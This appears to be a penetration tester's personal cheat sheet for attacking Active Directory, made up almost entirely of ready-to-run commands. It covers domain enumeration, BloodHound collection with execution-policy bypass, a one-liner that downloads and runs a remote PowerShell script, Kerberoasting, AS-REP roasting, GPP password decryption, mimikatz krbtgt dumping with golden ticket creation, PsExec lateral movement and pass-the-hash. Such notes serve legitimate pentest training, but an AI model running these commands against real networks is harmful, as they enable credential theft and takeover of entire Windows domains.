#show
<% tp.file.rename("2_AD_Enumeration")%>
### Primary DC (PDC):
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
```
and DN:
```powershell
([adsi]'').distinguishedName
```
Then set LDAP path of AD:
```powershell
$LDAP` = `LDAP://$PDC/$DN`
```

Also, change the Enumeration Limit:
```powershell
$Global:FormatEnumerationLimit = 100
```

##### Set up `$dirsearcher`
```powershell
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry($LDAP))
```
### User
```powershell
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()
Foreach($obj in $result){ $obj.Properties | select {$_.name}, {$_.memberof}, {$_.logoncount} | Format-List }
```
Alternative: `net user /domain`

### Groups
```powershell
$dirsearcher.filter="objectclass=group"
$result = $dirsearcher.FindAll()
Foreach($obj in $result){ $obj.Properties | select {$_.cn}, {$_.member} | Format-List }
```
Alternative: `net group /domain`
List of default groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
To get more details on a group: `$dirsearcher.filter="(&(objectCategory=group)(cn=Sales Department))"; $dirsearcher.FindAll()`

### AD-integrated services
```powershell
setspn -L $user
```

# BloodHound
1. **Setup C2 (Kali)**
```bash
sudo neo4j console && bloodhound
```

```bash
firefox.exe http://localhost:7474
```
(Username and passwort is both "neo4j" by default, we change the latter to "wandton")

One must also transfer the SharpHound script or executable to the victim ([[2_fileTransfer]])

2. **Collect data (Victim)**
```powershell
powershell -ep bypass
```

```powershell
.\SharpHound.exe --CollectionMethods All
```
or
```powershell
Import-Module .\Sharphound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory $dir
```
(Both gather all data except for local group policies.)

When done, transfer the .zip to kali ([[2_fileTransfer]])

3. **Analyze data (Kali)**
	1. In the Web-Interface, use the "Upload Data" function to upload the .zip
	2. Click the "More Info" tab on the top left. Change to tab "Analysis"
	3. Search for our owned prinicpals in the top left search bar. Right-click the node and select "Mark User as Owner"
	4. Select "Shortest Paths to Domain Admins from Owned Principals"
	Tips: Use the Control-Key to show information about all nodes. Look for the "?" Help menu, it also contains abuse possibilities.


------------

[AD Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)
# ADPeas
```powershell
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
```
Wrapper arount BloodHound, PowerView and much more.

# PowerView.ps1

##### Users
```powershell
Get-NetUser | select cn, pwdlastset,lastlogon
````

```powershell
Get-NetGroup | select cn, member
```
##### Systems
```powershell
Get-NetComputer | select operatingsystem, operatingsystemversion, dnshostname
```
##### Systems the current user has admin privs on
```powershell
Find-LocalAdminAccess
```
##### Logged-In users
```powershell
Get-NetSession -ComputerName $host -Verbose
```
(Only works below Windows Server 2019 build 1809 or Windows 10 build 1709)
##### AD-integrated services
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
##### Shares
```powershell
Find-DomainShare
```
Use flag `-CheckShareAccess` to only list shares we have access to.
##### Check DCSync Permission
```powershell
Get-ObjectAcl -DistinguishedName "dc=XXX,dc=XXX,dc=XXX" -ResolveGUIDs | ?{($_.IdentityReference -match "XXXUSERNAMEXXX") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
##### Map Trusts
```powershell
Get-NetForestDomain | Get-NetDomainTrust
```

# Manual approach

##### Logged-In users
```powershell
.\PsLoggedon.exe \\$host
```
(SysInternals, requires _Remote Registry service_ on the target which is disabled by default since Windows 8, but enabled on Windows Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2))

##### ACEs to an object
```powershell
Get-ObjectAcl -Identity $object [ | ? {"GenericAll", "GenericWrite", "WriteOwner", "WriteDACL" -eq $_.ActiveDirectoryRights} ] | Select ActiveDirectoryRights, SecurityIdentifier
```
The middle part restricts the search to full-access but can be left out.
Permission descriptions:
	GenericAll: Full permissions on object
	GenericWrite: Edit certain attributes on the object
	WriteOwner: Change ownership of the object
	WriteDACL: Edit ACE's applied to object
	AllExtendedRights: Change password, reset password, etc.
	ForceChangePassword: Password change for object
	Self (Self-Membership): Add ourselves to for example a group
The SecurityIdentifier names the principal that has the listed permission to the queued object. As object, we can use the cleartext name to any AD object, e.g., an user, group or share name.
Make SID human readable: `Convert-SidToName $sid` (PowerView)
##### Add user to group
```powershell
net group $group $user /add /domain
```
##### Decrypt password set through GPP
```bash
gpp-decrypt "$hash"
```


# Yet-to-test attacks

##### Kerberoast
```powershell
impacket-GetUserSPNs -request -outputfile kerbi.txt -target-domain $domain -dc-ip $hip domain/username:password
```
##### ASREPRoasting
Find users that don't require preauth
1. Bruteforce user names or
   ```powershell
   Get-DomainUser -PreauthNotRequired -Verbose | ft
   ```
   (PowerView_dev.ps1)
2. 
   ```bash
   python3 ~/tools/impacket/build/scripts-3.11/GetNPUsers.py -dc-host $hip -no-pass -usersfile users.txt $dnsserver -o asrep.hashes
   ```
3.  Use hashcat with -m 18200

##### Request SPN Tickets
```powershell
Get-DomainUser -Identity $user | Get-DomainSPNTicket | select -ExpandProperty Hash
```
(PowerView.ps1)

##### Golden Ticket with mimikatz
```
privilege::debug
```

Save Domain ID (sid), Primary NTLM
```
lsadump::lsa /inject /name:krbtgt
```

Create Golden Ticket (saved to ticket.kirbi)
```
kerberos::golden /user:Administrator /domain:%dns% /sid:%sid% /krbtgt:%ntlm% /id:500
```

Open a CMD with elevated privileges to all machines
```
misc::cmd
```

Runs cmd.exe on $machine (Needs PsExec.exe - you can scp) 
```powershell
PsExec.exe \\$machine cmd.exe
```

##### Pass-The-Hash Attack
```
evil-winrm -i $hip -u $user -H $hash
```
